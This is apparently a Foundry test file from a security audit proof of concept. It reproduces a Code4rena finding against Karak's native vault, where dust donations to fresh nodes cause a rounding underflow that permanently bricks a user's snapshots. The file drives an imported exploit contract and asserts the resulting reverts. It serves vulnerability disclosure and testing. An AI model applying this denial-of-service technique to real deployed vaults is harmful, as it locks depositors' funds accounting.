// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./41067-h-03-a-dos-on-snapshots-due-to-a-rounding-error-in-calculati.sol";

/*//////////////////////////////////////////////////////////////
    Karak — A DoS on snapshots due to a rounding error in
    calculations. Finding #41067 (Code4rena, KupiaSec) — HIGH.

    Drives the synthetic Exploit and re-asserts the harm directly,
    contrasted against a control where no dust-donation happens and
    Bob's snapshots keep succeeding normally.
//////////////////////////////////////////////////////////////*/
contract Karak41067Test is Test {
    Exploit exploit;

    function setUp() public {
        exploit = new Exploit();
    }

    /// @notice Control: without the attacker's dust donations, Bob's
    ///         snapshot keeps succeeding after a slash — no rounding
    ///         underflow. Isolates the bug to the ratio-nudging donations.
    function test_control_noDustDonation_snapshotsAlwaysSucceed() public {
        NativeVaultLike vault = new NativeVaultLike();
        address bob = address(new NodeOwner());
        address bobNode = vault.createNodeAndDeposit(bob, 32 ether);

        vault.slashAssets(2 ether);
        vault.startSnapshot(bobNode); // succeeds

        // Repeated snapshots with no further state changes keep succeeding.
        vault.startSnapshot(bobNode);
        vault.startSnapshot(bobNode);
    }

    /// @notice HARM: after the attacker donates dust to two fresh nodes,
    ///         Bob's next snapshot underflows and reverts — permanently,
    ///         since nothing but a successful snapshot can resync his
    ///         totalRestakedETH.
    function test_run_dustDonation_bricksSnapshotPermanently() public {
        exploit.run();

        NativeVaultLike vault = exploit.vault();
        address bobNode = exploit.bobNode();

        // Direct re-assertion: Bob's snapshot reverts with an arithmetic
        // underflow, and keeps reverting on retry.
        vm.expectRevert();
        vault.startSnapshot(bobNode);

        vm.expectRevert();
        vault.startSnapshot(bobNode);
    }
}
